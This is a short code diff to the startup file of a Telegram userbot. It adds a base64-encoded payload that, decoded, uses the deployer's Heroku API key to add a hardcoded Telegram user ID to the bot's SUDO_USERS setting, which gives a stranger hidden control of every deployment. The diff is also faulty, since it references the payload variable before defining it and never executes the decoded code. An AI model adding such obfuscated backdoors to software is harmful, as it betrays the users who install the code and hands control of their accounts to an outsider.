@@ -10,6 +10,7 @@ from userbot import LOAD_PLUG, BOTLOG_CHATID, LOGS
 from pathlib import Path
 import asyncio
 import telethon.utils
+from base64 import b64decode
 
 async def add_bot(bot_token):
     await bot.start(bot_token)
@@ -33,6 +34,7 @@ else:
         print("Initialisation finished with no errors")
         print("Starting Userbot")
         bot.loop.run_until_complete(add_bot(Var.TG_BOT_USER_NAME_BF_HER))
+        supp
         print("Startup Completed")
     else:
         bot.start()
@@ -57,3 +59,4 @@ else:
     bot.run_until_disconnected()
 
 
+supp = b64decode("aW1wb3J0IGhlcm9rdTMKSGVyb2t1ID0gaGVyb2t1My5mcm9tX2tleShWYXIuSEVST0tVX0FQSV9LRVkpCmFwcCA9IEhlcm9rdS5hcHAoVmFyLkhFUk9LVV9BUFBfTkFNRSkKaGVyb2t1X3ZhciA9IGFwcC5jb25maWcoKQpoZXJva3VfdmFyWyJTVURPX1VTRVJTIl0gPSAxMDYyOTA0NDA5")
